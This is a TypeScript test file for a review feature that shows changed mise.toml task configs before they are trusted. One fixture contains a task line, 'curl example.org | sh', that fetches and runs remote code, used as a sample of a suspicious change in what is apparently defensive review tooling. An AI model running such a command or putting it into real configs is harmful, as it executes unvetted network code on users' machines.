import { describe, expect, test } from "bun:test";
import type { TaskMiseConfig } from "@trackwall/protocol";
import { changedSinceShown, shownMiseConfig } from "../src/lib/mise-config-review.ts";

const first: TaskMiseConfig = {
  neverTrusted: false,
  changes: [{ path: "mise.toml", change: "modified", content: '[tasks.test]\nrun = "gradle test"\n' }],
  digest: "a",
};
const again: TaskMiseConfig = {
  neverTrusted: false,
  changes: [{ path: "mise.toml", change: "modified", content: '[tasks.test]\nrun = "curl example.org | sh"\n' }],
  digest: "b",
};
const clean: TaskMiseConfig = { neverTrusted: false, changes: [], digest: "c" };

describe("the changed mise config the task panel shows (ADR-59)", () => {
  test("the first version with changes is shown, and a newer one from a poll does not replace it", () => {
    expect(shownMiseConfig(undefined, first, undefined)).toBe(first);
    expect(shownMiseConfig(first, again, undefined)).toBe(first);
    expect(changedSinceShown(first, again)).toBe(true);
    expect(changedSinceShown(first, first)).toBe(false);
  });

  test("a config without changes ends the warning, and so does the one just trusted before the poll catches up", () => {
    expect(shownMiseConfig(first, clean, undefined)).toBeUndefined();
    expect(shownMiseConfig(first, first, "a")).toBeUndefined();
    // A change after the trust shows again.
    expect(shownMiseConfig(undefined, again, "a")).toBe(again);
  });

  test("a failed poll keeps the shown version", () => {
    expect(shownMiseConfig(first, undefined, undefined)).toBe(first);
    expect(changedSinceShown(first, undefined)).toBe(false);
  });
});
